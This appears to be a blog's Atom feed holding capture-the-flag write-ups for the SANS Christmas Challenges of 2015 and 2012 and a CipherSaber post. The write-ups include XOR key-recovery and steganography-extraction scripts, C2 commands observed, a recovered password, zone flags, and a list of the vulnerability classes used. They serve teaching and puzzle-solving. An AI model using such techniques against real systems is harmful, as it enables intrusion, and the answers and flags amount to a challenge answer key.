                &lt;span class="n"&gt;scrambled_image_pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r1&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;g1&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;g2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b1&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;b2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# We save the result in a new image&lt;/span&gt;
    &lt;span class="n"&gt;scrambled_image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;result.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;PNG&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then, we just have to run this script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./unxor_images.py sg01/factory_cam_1.png sg02/factory_cam_2.png sg03/factory_cam_3.png &lt;span class="se"&gt;\&lt;/span&gt;
    sg04/factory_cam_4.png sg05/factory_cam_5.png camera_feed_overlap_error.png
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This gives us the resulting image:&lt;/p&gt;
&lt;img alt="sans_xor_image_result.png" class="align-center" src="/images/sans-christmas-challenge-2015/sans_xor_image_result.png" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="epilogue-twas-the-gnome-before-christmas-wrapping-it-all-up"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id22"&gt;Epilogue: ‘Twas the Gnome Before Christmas: &lt;em&gt;Wrapping It All Up&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;As in every SANS Christmas Challenge, we have to answer several
questions:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Which commands are sent across the Gnome’s command-and-control
channel?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The command sent to the command-and-control server are &lt;code&gt;iwconfig&lt;/code&gt; and
&lt;code&gt;cat /tmp/iwlistscan.txt&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;What image appears in the photo the Gnome sent across the
channel from the Dosis home?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We can see a picture of Josh's bedroom.&lt;/p&gt;
&lt;ol class="arabic simple" start="3"&gt;
&lt;li&gt;What operating system and CPU type are used in the Gnome?
What type of web framework is the Gnome web interface built in?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The Gnome is running OpenWRT in the development branch.
Its CPU architecture is 32-bit ARM. The web interface is built
with NodeJS, with Jade Node as the template engine.&lt;/p&gt;
&lt;ol class="arabic simple" start="4"&gt;
&lt;li&gt;What kind of a database engine is used to support the Gnome web
interface? What is the plaintext password stored in the Gnome database?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The database engine is MongoDB. The plaintex password is
&lt;code&gt;SittingOnAShelf&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;What are the IP addresses of the five SuperGnomes scattered around the
world, as verified by Tom Hessman in the Dosis neighborhood?&lt;/li&gt;
&lt;li&gt;Where is each SuperGnome located geographically?&lt;/li&gt;
&lt;/ol&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;SuperGnome01: 52.2.229.189, located in United States, Ashburn (VI)&lt;/li&gt;
&lt;li&gt;SuperGnome02: 52.34.3.80, located in United States, Portland (OR)&lt;/li&gt;
&lt;li&gt;SuperGnome03: 52.64.191.71, located in Australia, Sydney&lt;/li&gt;
&lt;li&gt;SuperGnome04: 52.192.152.132, located in Japan, Tokyo&lt;/li&gt;
&lt;li&gt;SuperGnome05: 54.233.105.81, located in Brazil, Sao Paulo&lt;/li&gt;
&lt;/ul&gt;
&lt;ol class="arabic simple" start="7"&gt;
&lt;li&gt;Please describe the vulnerabilities you discovered in the
Gnome firmware.&lt;/li&gt;
&lt;li&gt;Describe the technique you used to gain access to each SuperGnome’s
gnome.conf file.&lt;/li&gt;
&lt;/ol&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;SuperGnome01: Credentials stored in plaintext. Reuse of credentials.&lt;/li&gt;
&lt;li&gt;SuperGnome02: Arbitrary folder creation. Local file inclusion.&lt;/li&gt;
&lt;li&gt;SuperGnome03: NoSQL injection&lt;/li&gt;
&lt;li&gt;SuperGnome04: Server Side JavaScript injection&lt;/li&gt;
&lt;li&gt;SuperGnome05: Buffer-overflow&lt;/li&gt;
&lt;/ul&gt;
&lt;ol class="arabic simple" start="9"&gt;
&lt;li&gt;Based on evidence you recover from the SuperGnomes’ packet capture ZIP
files and any staticky images you find, what is the nefarious plot of
ATNAS Corporation?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The plot of the ATNAS Corporation is to sell millions of Gnomes to families,
so that they can identify valuable objects, and then come and steal it during
Christmas night, by disguising themselves as Santy Claus.&lt;/p&gt;
&lt;ol class="arabic simple" start="10"&gt;
&lt;li&gt;Who is the villain behind the nefarious plot?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The villain is none other that
&lt;a class="reference external" href="http://seuss.wikia.com/wiki/Cindy_Lou_Who"&gt;Cindy Lou Who&lt;/a&gt;. After being
traumatised by the Grinch stealing Christmas, she has developped a deep
hatred for this holiday.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id23"&gt;Conclusion&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;I really enjoyed doing this challenge, because it allowed me to develop
my skills in technologies I'm not familiar with, such as NoSQL database
engines, or buffer-overflow (something I should really work on).&lt;/p&gt;
&lt;p&gt;Many thanks to the SANS institute for this incredible Christmas Challenge!&lt;/p&gt;
&lt;/div&gt;
</content></entry><entry><title>May the Cipher be with you</title><link href="https://allyourbase.utouch.fr/posts/2013/02/03/may-the-cipher-be-with-you/" rel="alternate"></link><published>2013-02-03T01:42:00+01:00</published><updated>2013-02-03T01:42:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2013-02-03:/posts/2013/02/03/may-the-cipher-be-with-you/</id><summary type="html">&lt;img alt="ciphersaber-logo.png" class="align-center" src="/images/may-the-cipher-be-with-you/ciphersaber-logo.png" /&gt;
&lt;p&gt;NB: I know that implementing cryptographic algorithms yourself is
dangerous. There are many implementation problems people won't think
about, like memory management. I just wanted to talk about the
CipherSaber because I think it's an old, yet neat project. I think it's
important to sensitize people about cryptography and the …&lt;/p&gt;</summary><content type="html">&lt;img alt="ciphersaber-logo.png" class="align-center" src="/images/may-the-cipher-be-with-you/ciphersaber-logo.png" /&gt;
&lt;p&gt;NB: I know that implementing cryptographic algorithms yourself is
dangerous. There are many implementation problems people won't think
about, like memory management. I just wanted to talk about the
CipherSaber because I think it's an old, yet neat project. I think it's
important to sensitize people about cryptography and the regulations
around its usage. &lt;strong&gt;If you want to use cryptography to protect your
privacy, I suggest you look at a more serious project like PGP.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A few months ago, while checking my RSS feeds, I saw &lt;a class="reference external" href="http://www.reddit.com/r/netsec/comments/10d7zb/are_there_any_inprogress_opensource_cryptography/"&gt;this discussion&lt;/a&gt;
on Reddit. Since I love cryptography and FLOSS, I looked at the comment
section, to see what kind of answers were posted.&lt;/p&gt;
&lt;p&gt;One comment caught my attention:&lt;/p&gt;
&lt;img alt="ciphersaber-comment.png" class="align-center" src="/images/may-the-cipher-be-with-you/ciphersaber-comment.png" /&gt;
&lt;p&gt;What intrigued me was the idea of creating your own &amp;quot;something&amp;quot; (plus,
the &amp;quot;something&amp;quot; had a really cool name), and I also like the fact that I
could start right away.&lt;/p&gt;
&lt;p&gt;So, I went to the &lt;a class="reference external" href="http://ciphersaber.gurus.org/"&gt;CipherSaber&lt;/a&gt; web
page, to see what's what. And, being the privacy advocate that I am, I
was not disappointed. The CipherSaber is a form of protest against US
ban on cryptography.&lt;/p&gt;
&lt;p&gt;It was written after 9/11, when the US government wanted to limit the
use/publication of cryptography, in order to prevent the terrorists from
using it. It's, of course, a ridiculous idea, since the crypto is
&lt;em&gt;already&lt;/em&gt; out there, and anybody can use it, even the terrorists: it's
a little too late to try to prevent cryptography export. Plus, as stated
in the CipherSaber web page, nothing would prevent terrorists to send
some of their members to US universities to learn cryptography, as they
do to learn chemistry, nuclear engineering etc.&lt;/p&gt;
&lt;p&gt;As my good friend (okay, we've never met, but still, he has a point)
Philip Zimmermann said:&lt;/p&gt;
&lt;blockquote&gt;
If privacy is outlawed, only outlaws will have privacy.&lt;/blockquote&gt;
&lt;p&gt;The idea behind the CipherSaber, is to have everyone implementing a
strong crypto algorithm, so that people don't rely on products that can
be banned. The chosen algorithm is the stream cipher RC4, because it's
strong, and easy to implement (see CipherSaber-2 in the web page to
correct a known vulnerability in RC4). The name CipherSaber comes from
Star Wars, because every Jedi knight has to build its own light saber,
just like every CipherKnight should implement its own CipherSaber.&lt;/p&gt;
&lt;p&gt;I know I'm not from the US, and I know this web page was written ten
years ago, but I like the idea of being a part of some community, and
Internet ban concern everyone. That's why I've decided to revamp the
CipherKnight's certificate (the old one, in addition to being hard to
find, is too directed towards Americans).&lt;/p&gt;
&lt;p&gt;All you have to do to get your certificate is to enter your name, click
the button, and decipher it using your own CipherSaber (the encryption
key is &lt;em&gt;AlanTuring&lt;/em&gt;).&lt;/p&gt;
&lt;form action="/cscertificate/index.php" method="post"&gt;
     &lt;label for="name"&gt;Name&lt;/label&gt;: &lt;input name="name" type="text"&gt; &lt;input value="Get your certificate!" type="submit"&gt;
&lt;/form&gt;&lt;p&gt;If you're old school, you can get the former CipherKnight's certificate
&lt;a class="reference external" href="https://allyourbase.utouch.fr/wp-content/uploads/2014/08/cknight.cs1"&gt;here&lt;/a&gt;
(the encryption key is &lt;em&gt;ThomasJefferson&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;So go ahead, forge your own CipherSaber, print out your certificate, and
spread the word.&lt;/p&gt;
&lt;p&gt;May the Cipher be with you.&lt;/p&gt;
</content></entry><entry><title>SANS Christmas Challenge 2012</title><link href="https://allyourbase.utouch.fr/posts/2013/01/07/sans-christmas-challenge-2012/" rel="alternate"></link><published>2013-01-07T12:20:00+01:00</published><updated>2013-01-07T12:20:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2013-01-07:/posts/2013/01/07/sans-christmas-challenge-2012/</id><summary type="html">&lt;img alt="sans_christmas_challenge_2012_logo.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/sans_christmas_challenge_2012_logo.jpg" /&gt;
&lt;p&gt;During December, SANS posted a &lt;a class="reference external" href="http://pen-testing.sans.org/holiday-challenge/2012"&gt;Christmas
challenge&lt;/a&gt; based
on a Christmas story.&lt;/p&gt;
&lt;p&gt;This year, Santa is sad because he feels that nobody believes in him
anymore, so he decides to cancel Christmas. Mrs. Claus wants to cheer
her husband up, in order not to let children down, but her reindeer …&lt;/p&gt;</summary><content type="html">&lt;img alt="sans_christmas_challenge_2012_logo.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/sans_christmas_challenge_2012_logo.jpg" /&gt;
&lt;p&gt;During December, SANS posted a &lt;a class="reference external" href="http://pen-testing.sans.org/holiday-challenge/2012"&gt;Christmas
challenge&lt;/a&gt; based
on a Christmas story.&lt;/p&gt;
&lt;p&gt;This year, Santa is sad because he feels that nobody believes in him
anymore, so he decides to cancel Christmas. Mrs. Claus wants to cheer
her husband up, in order not to let children down, but her reindeer gets
imprisoned in Southtown's dog pound. The mayor accepts to let Vixen, the
reindeer, go if Mrs. Claus can make it snow in Southtown, which is a
relatively hot region.&lt;/p&gt;
&lt;p&gt;So Mrs. Claus goes to see Snow Miser, who is in charge of the cold
weather. Unfortunately, he refuses to make it snow in Southtown, because
it's in his brother's, Heat Miser, territory. But Heat Miser agrees to
make it snow in Southtown as long as he's allowed to melt the North
Pole. Unfortunately, the brothers are too stubborn, and refuse to let
each other have control over the other's territory. So Mrs. Claus takes
it to a higher authority: Mother Nature, who forces the brothers to
cooperate.&lt;/p&gt;
&lt;p&gt;Since they have to collaborate, Snow Miser and Heat Miser decide to
have a little fun and make it a competition: they both have to hack
every level of the other brother's weather control. You can follow
&lt;a class="reference external" href="https://twitter.com/sn0w_m1s3r"&gt;&amp;#64;sn0w_m1s3r&lt;/a&gt; and
&lt;a class="reference external" href="https://twitter.com/h34t_m1s3r"&gt;&amp;#64;h34t_m1s3r&lt;/a&gt; on Twitter.&lt;/p&gt;
&lt;p&gt;To make things interesting, SANS posted six questions, and will
reward the best answers:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Where did you find the remainder of Snow Miser's Zone 1 URL?&lt;/li&gt;
&lt;li&gt;What is the key you used with steghide to extract Snow Miser's Zone 2
URL? Where did you find the key?&lt;/li&gt;
&lt;li&gt;On Snow Miser's Zone 3 page, why is using the same key multiple times
a bad idea?&lt;/li&gt;
&lt;li&gt;What was the coding error in Zone 4 of Heat Miser's site that allowed
you to find the URL for Zone 5?&lt;/li&gt;
&lt;li&gt;How did you manipulate the cookie to get to Zone 5 of Heat Miser's
Control System?&lt;/li&gt;
&lt;li&gt;Please briefly describe the process, steps, and tools you used to
conquer each zone, including all of the flags hidden in the comments
of each zone page.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I'll focus on the sixth question, while answering the first questions in
my write up.&lt;/p&gt;
&lt;div class="section" id="snow-miser"&gt;
&lt;h2&gt;&lt;a class="reference external" href="http://snowmiser.counterhack.com/"&gt;Snow Miser&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="zone-0"&gt;
&lt;h3&gt;Zone 0&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;3b5a630fc67251aa5555f4979787c93f&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Unlike my brother, my fridged minions (without freakish hair) didn't
mess up and leak our URLs to search engines or have to block them
from the search engines. There is no vulnerability to get to the
next zone and you will not find a vulnerability here. Move along.&lt;/p&gt;
&lt;p&gt;Those of you with proper access, the URL you need starts with the
following:&lt;/p&gt;
&lt;p&gt;zone-1-D2E31380-50E6-4869-8A85-XXXXXXXXXXXX&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The URL is composed only of digits (0 through 9) and letters (A through
F), which gives us 281.474.976.710.656 possible combinations. We can't
bruteforce so many combinations (plus, it's explicitly stated in the
challenge's rules that bruteforce is disallowed).&lt;/p&gt;
&lt;p&gt;Fortunately, Snow Miser tweets this message:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_1.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_1.png" /&gt;
&lt;p&gt;Here's the posted image:&lt;/p&gt;
&lt;img alt="snow_miser_glass_reflection.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_glass_reflection.jpg" /&gt;
&lt;p&gt;We can see in the something interesting in the screen's reflection in
the glass: the end of the URL we're looking for. With a tool like GIMP,
we can manipulate the image to make it easier to read it:&lt;/p&gt;
&lt;img alt="snow_miser_glass_reflection_enhanced.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_glass_reflection_enhanced.jpg" /&gt;
&lt;p&gt;Which gives us this final URL:
zone-1-D2E31380-50E6-4869-8A85-F9CDB3AF6226&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-1"&gt;
&lt;h3&gt;Zone 1&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;38bef0b61ba8edda377b626fe6708bfa&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
One of my minions, who has been turned into a snowman, messed up and
changed the URL for Zone 2. If you have access to this level you can
analyze the images and access the next zone.&lt;/blockquote&gt;
&lt;p&gt;This message kind of points to some sort of steganography use. This is
where the second question helps us. We know the program steghide was
used on a image. While looking at the website's images, we can see that
they're all PNG, except for &lt;a class="reference external" href="/images/sans-christmas-challenge-2012/off.jpg"&gt;this
one&lt;/a&gt;,
which is JPG. Since steghide doesn't support PNG, we know that the URL
is hidden in the last image.&lt;/p&gt;
&lt;p&gt;Now, we need to find the key, in order to extract the hidden file. If
you open the image in a hexadecimal editor, you'll find an ASCII string,
&amp;quot;IceIceBaby!&amp;quot;. Let's use it as the key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ steghide extract -sf off.jpg
Enter passphrase: IceIceBaby!
Extracted data written to tmpfile.txt
$ cat tmpfile.txt
zone-2-6D46A633-25D7-42C8-AF94-8E786142A3E3
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-2"&gt;
&lt;h3&gt;Zone 2&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;b8231c2bac801b54f732cfbdcd7e47b7&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The same minion that messed up the Zone 2 link also messed up the
Zone 3 link. Make sure you use the new link that starts with:&lt;/p&gt;
&lt;p&gt;zone-3-EAB6B031-4EFA-49F1-B542-XXXXXXXXXXXX&lt;/p&gt;
&lt;p&gt;Please do not tweet the links or parts of the links.&lt;/p&gt;
&lt;p&gt;All security issues that used to allow access to the next zone have
been fixed. There is no vulnerability to get to the next zone and
you will not find a vulnerability here. Move along.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Heat Miser kindly tweets:&lt;/p&gt;
&lt;img alt="heat_miser_tweet_2.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_tweet_2.png" /&gt;
&lt;p&gt;You can retrieve Snow Miser's data
&lt;a class="reference external" href="/docs/sans-christmas-challenge-2012/android.data_.tar.gz"&gt;here&lt;/a&gt;
(sha256:
&lt;code&gt;286387c77b533aae4d605d85a5e74c819f3e0ca7ca42b991ddd29abf9ff5a6b4&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;After extracting it, we can use some shell mojo to find files mentioning
the zone 3 URL:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ tar -xzvf android.data.tgz
$ &lt;span class="nb"&gt;cd&lt;/span&gt; data
$ grep -Rn &lt;span class="s2"&gt;&amp;quot;zone-3&amp;quot;&lt;/span&gt; . &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt; /dev/null
Binary file ./data/com.android.browser/cache/browser_state.parcel
concordant
Binary file
./data/com.android.browser/cache/webviewCacheChromium/data_1 concordant
Binary file
./data/com.android.browser/cache/webviewCacheChromium/data_2 concordant
Binary file ./data/com.android.browser/databases/browser2.db
concordant
Binary file ./data/com.android.browser/databases/browser2.db-wal
concordant
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The first file looks is a browser cache file, which may contain the
wanted URL. By reading it, we'll find:
zone-3-EAB6B031-4EFA-49F1-B542-30EBE9EB3962&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-3"&gt;
&lt;h3&gt;Zone 3&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;08ba610172aade5d1c8ea738013a2e99&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;To reduce the impact of URL exposure or modification we have added a
new mechanism to distribute changes to the URL (thanks to that
minion that broke Zones 2+). Those of you with with access to Zone 4
should have received an encryption key. This key can be used to
decrypt the URL for Zone 4. This allows us to securely communicate
it to you without risk of unauthorized access.&lt;/p&gt;
&lt;p&gt;To verify your key you can check the previous Zone 4 URL:&lt;/p&gt;
&lt;p&gt;zone-4-F7677DA8-3D77-11E2-BB65-E4BF6188709B&lt;/p&gt;
&lt;p&gt;20d916c6c29ee53c30ea1effc63b1c72147eb86b998a25c0cf1bf66939e8621b3132d83abb1683df619238&lt;/p&gt;
&lt;p&gt;The new Zone 4 encrypted string is:
20d916c6c29ee54343e81ff1b14c1372650cbf19998f51b5c51bf66f49ec62184034a94fc9198fa9179849&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We know the cipher texts both encrypt plain texts starting with zone-4-,
and by looking at them, we can see that they both start with the same
letters. It hints to a bytewise encryption scheme. It turns out that
it's a XOR encryption. The first &amp;quot;oops&amp;quot; here, is that since we're given
a plain text and its cipher text, we can recover the whole key. Indeed,
by the propriety of the XOR operator (here denoted by &lt;span class="formula"&gt;⊕&lt;/span&gt;):&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;span class="formula"&gt;&lt;i&gt;c&lt;/i&gt; = &lt;i&gt;k&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class="formula"&gt;&lt;i&gt;c&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt; = &lt;i&gt;k&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt; = &lt;i&gt;k&lt;/i&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The second &amp;quot;oops&amp;quot; is using the same key twice, because now that we have
the key, we can decrypt the second cipher text:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class="c1"&gt;#-*- encoding: Utf-8 -*-&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;usage: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cipher1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cipher2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
    &lt;span class="n"&gt;plain2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="n"&gt;plain2&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;plain2&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now let's launch this program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ls
xor_encrypt.py
$ ./xor_enc.py zone-4-F7677DA8-3D77-11E2-BB65-E4BF6188709B
20d916c6c29ee53c30ea1effc63b1c72147eb86b998a25c0cf1bf66939e8621b3132d83abb1683df619238
20d916c6c29ee54343e81ff1b14c1372650cbf19998f51b5c51bf66f49ec62184034a94fc9198fa9179849
zone-4-9D469367-B60E-4E08-BDF1-FED7CC74AF33
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-4"&gt;
&lt;h3&gt;Zone 4&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;de32b158f102a60aba7de3ee8d5d265a&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Zone 5 requires top security. We are updating the code using svn 1.7
and have implemented One-Time-Password (OTP) functionality to access
Zone 5.&lt;/p&gt;
&lt;p&gt;The passwords are in a SHA1 format, so they are unguessable.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If we look at the source code, we can see that the One Time Password is
sent to the zone 5 URL, so we don't have to look very far to find it.
But if we try to access it directly, we're redirected to a page,
noaccess.php. With this tweet, Heat Miser gives us a big hint:&lt;/p&gt;
